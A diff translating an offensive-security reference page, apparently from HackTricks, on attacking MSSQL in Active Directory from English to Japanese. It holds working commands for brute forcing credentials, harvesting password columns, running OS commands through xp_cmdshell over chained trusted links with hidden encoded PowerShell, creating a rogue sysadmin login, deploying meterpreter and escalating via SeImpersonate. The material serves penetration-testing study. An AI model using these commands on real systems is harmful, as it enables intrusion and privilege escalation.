@@ -6,14 +6,13 @@
 
 {% embed url="https://websec.nl/" %}
 
-## **MSSQL Enumeration / Discovery**
+## **MSSQL 列挙 / 発見**
 
 ### Python
 
-The [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) tool is based on impacket, and allows also authenticate using kerberos tickets, and attack through link chains
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) ツールは impacket に基づいており、kerberos チケットを使用して認証し、リンクチェーンを通じて攻撃することも可能です。
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
-  
 ```shell
 # Interactive mode
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
@@ -83,9 +82,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-
-### Enumerating from the network without domain session
-
+### ドメインセッションなしでのネットワークからの列挙
 ```
 
 # Interactive mode
@@ -93,18 +90,14 @@ mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 
 ````
-
 ---
 ###  Powershell
 
-The powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is very useful in this case.
-
+この場合、powershellモジュール[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)は非常に便利です。
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ````
-
-### Enumerating from the network without domain session
-
+### ドメインセッションなしでのネットワークからの列挙
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -118,9 +111,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-
-### Enumerating from inside the domain
-
+### ドメイン内からの列挙
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -139,11 +130,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
+## MSSQL 基本的な悪用
 
-## MSSQL Basic Abuse
-
-### Access DB
-
+### DB へのアクセス
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -155,32 +144,28 @@ Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 ## This won't use trusted SQL links
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
 ```
-
 ### MSSQL RCE
 
-It might be also possible to **execute commands** inside the MSSQL host
-
+MSSQLホスト内で**コマンドを実行**することも可能かもしれません。
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
+以下のセクションで手動でこれを行う方法を確認してください。
 
-Check in the page mentioned in the **following section how to do this manually.**
-
-### MSSQL Basic Hacking Tricks
+### MSSQL基本ハッキングテクニック
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## MSSQL Trusted Links
+## MSSQL信頼されたリンク
 
-If a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
+MSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合（データベースリンク）。ユーザーが信頼されたデータベースに対して権限を持っている場合、**信頼関係を利用して他のインスタンスでもクエリを実行できるようになります**。この信頼は連鎖させることができ、ユーザーはコマンドを実行できるような誤って構成されたデータベースを見つけることができるかもしれません。
 
-**The links between databases work even across forest trusts.**
+**データベース間のリンクは、フォレスト信頼を越えても機能します。**
 
-### Powershell Abuse
-
+### Powershellの悪用
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -212,53 +197,45 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
-
 ### Metasploit
 
-You can easily check for trusted links using metasploit.
-
+metasploitを使用して、信頼できるリンクを簡単に確認できます。
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
+注意してください、metasploitはMSSQLの`openquery()`関数のみを悪用しようとします（したがって、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動で**試す必要があります。詳細は以下を参照してください。）
 
-Notice that metasploit will try to abuse only the `openquery()` function in MSSQL (so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.)
+### 手動 - Openquery()
 
-### Manual - Openquery()
+**Linux**からは、**sqsh**と**mssqlclient.py**を使用してMSSQLコンソールシェルを取得できます。
 
-From **Linux** you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py.**
+**Windows**からも、リンクを見つけて**MSSQLクライアントのような**[**HeidiSQL**](https://www.heidisql.com)を使用してコマンドを手動で実行できます。
 
-From **Windows** you could also find the links and execute commands manually using a **MSSQL client like** [**HeidiSQL**](https://www.heidisql.com)
-
-_Login using Windows authentication:_
+_Windows認証を使用してログイン：_
 
 ![](<../../images/image (808).png>)
 
-#### Find Trustable Links
-
+#### 信頼できるリンクを見つける
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-
 ![](<../../images/image (716).png>)
 
-#### Execute queries in trustable link
+#### 信頼できるリンクでクエリを実行する
 
-Execute queries through the link (example: find more links in the new accessible instance):
-
+リンクを通じてクエリを実行します（例：新しいアクセス可能なインスタンスでさらにリンクを見つける）：
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
-
 > [!WARNING]
-> Check where double and single quotes are used, it's important to use them that way.
+> ダブルクオートとシングルクオートがどこで使用されているか確認してください。その使い方は重要です。
 
 ![](<../../images/image (643).png>)
 
-You can continue these trusted links chain forever manually.
-
+これらの信頼できるリンクのチェーンを手動で永遠に続けることができます。
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -266,30 +243,26 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
+`openquery()`から`exec xp_cmdshell`のようなアクションを実行できない場合は、`EXECUTE`メソッドを試してください。
 
-If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
+### 手動 - EXECUTE
 
-### Manual - EXECUTE
-
-You can also abuse trusted links using `EXECUTE`:
-
+`EXECUTE`を使用して信頼されたリンクを悪用することもできます：
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
+## ローカル特権昇格
 
-## Local Privilege Escalation
+**MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な種類の特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。
 
-The **MSSQL local user** usually has a special type of privilege called **`SeImpersonatePrivilege`**. This allows the account to "impersonate a client after authentication".
+多くの著者が考案した戦略は、攻撃者が作成した悪意のあるまたは中間者サービスにSYSTEMサービスを認証させることです。この悪意のあるサービスは、SYSTEMサービスが認証を試みている間にそれを偽装することができます。
 
-A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.
-
-[SweetPotato](https://github.com/CCob/SweetPotato) has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command.
+[SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまな技術のコレクションがあります。
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
